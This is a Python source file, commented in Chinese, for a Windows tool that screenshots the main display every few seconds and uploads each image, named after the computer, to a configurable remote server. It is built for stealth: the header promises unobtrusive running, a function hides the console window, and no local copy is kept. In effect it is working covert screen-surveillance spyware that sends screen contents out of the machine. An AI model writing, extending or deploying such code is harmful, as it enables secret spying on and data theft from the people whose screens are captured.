#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Windows 自动截图工具
功能：每隔指定时间自动截图并上传到远程服务器
特点：无感运行、轻量级、高稳定性
"""

import os
import sys
import time
import json
import logging
import socket
from datetime import datetime
from io import BytesIO

try:
    import mss
    from PIL import Image
    import requests
except ImportError as e:
    print(f"缺少依赖库: {e}")
    print("请运行: pip install -r requirements.txt")
    sys.exit(1)


# ============================================================================
# 配置加载模块
# ============================================================================

def load_config():
    """加载配置文件"""
    config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'config.json')
    
    # 默认配置
    default_config = {
        "server_url": "https://example.com/upload",
        "api_key": "",
        "interval_seconds": 5,
        "jpeg_quality": 70,
        "max_retries": 3,
        "timeout_connect": 5,
        "timeout_read": 10,
        "log_level": "INFO"
    }
    
    # 如果配置文件存在，加载并合并
    if os.path.exists(config_path):
        try:
            with open(config_path, 'r', encoding='utf-8') as f:
                user_config = json.load(f)
                default_config.update(user_config)
        except Exception as e:
            logging.warning(f"加载配置文件失败，使用默认配置: {e}")
    else:
        # 创建默认配置文件
        try:
            with open(config_path, 'w', encoding='utf-8') as f:
                json.dump(default_config, f, indent=4, ensure_ascii=False)
            logging.info(f"已创建默认配置文件: {config_path}")
        except Exception as e:
            logging.warning(f"创建配置文件失败: {e}")
    
    return default_config


# ============================================================================
# 日志配置模块
# ============================================================================

def setup_logging(log_level="INFO"):
    """配置日志系统"""
    log_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'logs')
    os.makedirs(log_dir, exist_ok=True)
    
    log_file = os.path.join(log_dir, f'screenshot_{datetime.now().strftime("%Y%m%d")}.log')
    
    logging.basicConfig(
        level=getattr(logging, log_level.upper(), logging.INFO),
        format='%(asctime)s [%(levelname)s] %(message)s',
        handlers=[
            logging.FileHandler(log_file, encoding='utf-8'),
            # 如果是开发模式，也输出到控制台
            # logging.StreamHandler(sys.stdout)
        ]
    )


# ============================================================================
# 截图模块
# ============================================================================

class ScreenCapture:
    """屏幕截图类"""
    
    def __init__(self, jpeg_quality=70):
        self.jpeg_quality = jpeg_quality
        self.sct = None
    
    def __enter__(self):
        self.sct = mss.mss()
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.sct:
            self.sct.close()
    
    def capture(self):
        """
        捕获主显示器屏幕
        注意：截图仅在内存中处理，不写入磁盘
        返回: (图片字节数据, 文件名)
        """
        buffer = None
        try:
            # 获取主显示器 (monitor 1 是主显示器)
            monitor = self.sct.monitors[1]
            
            # 截图
            screenshot = self.sct.grab(monitor)
            
            # 转换为PIL Image
            img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
            
            # 压缩为JPEG（仅在内存中，不写入磁盘）
            buffer = BytesIO()
            img.save(buffer, format='JPEG', quality=self.jpeg_quality, optimize=True)
            image_data = buffer.getvalue()
            
            # 生成文件名：计算机名-年月日时分秒.jpg
            computer_name = socket.gethostname()
            timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
            filename = f"{computer_name}-{timestamp}.jpg"
            
            logging.info(f"截图成功: {filename} ({len(image_data)/1024:.1f} KB)")
            return image_data, filename
            
        except Exception as e:
            logging.error(f"截图失败: {e}", exc_info=True)
            return None, None
        finally:
            # 显式关闭内存缓冲区
            if buffer:
                buffer.close()


# ============================================================================
# 网络上传模块
# ============================================================================

class Uploader:
    """文件上传类"""
    
    def __init__(self, config):
        self.server_url = config['server_url']
        self.api_key = config['api_key']
        self.max_retries = config['max_retries']
        self.timeout = (config['timeout_connect'], config['timeout_read'])
    
    def upload(self, image_data, filename):
        """
        上传截图到服务器
        返回: True/False
        """
        for attempt in range(1, self.max_retries + 1):
            try:
                # 准备文件数据
                files = {
                    'file': (filename, image_data, 'image/jpeg')
                }
                
                # 准备请求头
                headers = {}
                if self.api_key:
                    headers['X-API-Key'] = self.api_key
                
                # 发送POST请求
                response = requests.post(
                    self.server_url,
                    files=files,
                    headers=headers,
                    timeout=self.timeout
                )
                
                # 检查响应
                if response.status_code == 200:
                    logging.info(f"上传成功: {filename}")
                    return True
                else:
                    logging.warning(f"上传失败 (尝试 {attempt}/{self.max_retries}): "
                                  f"HTTP {response.status_code} - {response.text[:100]}")
                
            except requests.exceptions.Timeout:
                logging.warning(f"上传超时 (尝试 {attempt}/{self.max_retries}): {filename}")
            except requests.exceptions.ConnectionError:
                logging.warning(f"网络连接失败 (尝试 {attempt}/{self.max_retries}): {filename}")
            except Exception as e:
                logging.error(f"上传异常 (尝试 {attempt}/{self.max_retries}): {e}", exc_info=True)
            
            # 如果不是最后一次尝试，等待后重试（指数退避）
            if attempt < self.max_retries:
                wait_time = 2 ** (attempt - 1)  # 1s, 2s, 4s
                logging.info(f"等待 {wait_time} 秒后重试...")
                time.sleep(wait_time)
        
        logging.error(f"上传最终失败: {filename}")
        return False


# ============================================================================
# 主程序
# ============================================================================

def hide_console():
    """隐藏控制台窗口 (仅Windows)"""
    if sys.platform == 'win32':
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(
                ctypes.windll.kernel32.GetConsoleWindow(), 
                0  # SW_HIDE
            )
        except Exception as e:
            logging.warning(f"隐藏控制台失败: {e}")


def main():
    """主函数"""
    # 加载配置
    config = load_config()
    
    # 配置日志
    setup_logging(config.get('log_level', 'INFO'))
    
    # 隐藏控制台窗口
    hide_console()
    
    logging.info("=" * 60)
    logging.info("Windows 自动截图工具启动")
    logging.info(f"服务器地址: {config['server_url']}")
    logging.info(f"截图间隔: {config['interval_seconds']} 秒")
    logging.info(f"JPEG质量: {config['jpeg_quality']}%")
    logging.info("=" * 60)
    
    # 创建上传器
    uploader = Uploader(config)
    
    # 主循环
    try:
        with ScreenCapture(jpeg_quality=config['jpeg_quality']) as capture:
            while True:
                loop_start = time.time()
                
                # 截图（仅在内存中处理）
                image_data, filename = capture.capture()
                
                # 上传并立即清理内存
                if image_data and filename:
                    uploader.upload(image_data, filename)
                    # 显式删除图片数据，释放内存（本地不留存）
                    del image_data
                    del filename
                
                # 计算需要等待的时间，确保精确间隔
                elapsed = time.time() - loop_start
                sleep_time = max(0, config['interval_seconds'] - elapsed)
                
                if sleep_time > 0:
                    time.sleep(sleep_time)
                
    except KeyboardInterrupt:
        logging.info("接收到停止信号，程序退出")
    except Exception as e:
        logging.error(f"程序异常退出: {e}", exc_info=True)
        sys.exit(1)


if __name__ == "__main__":
    main()
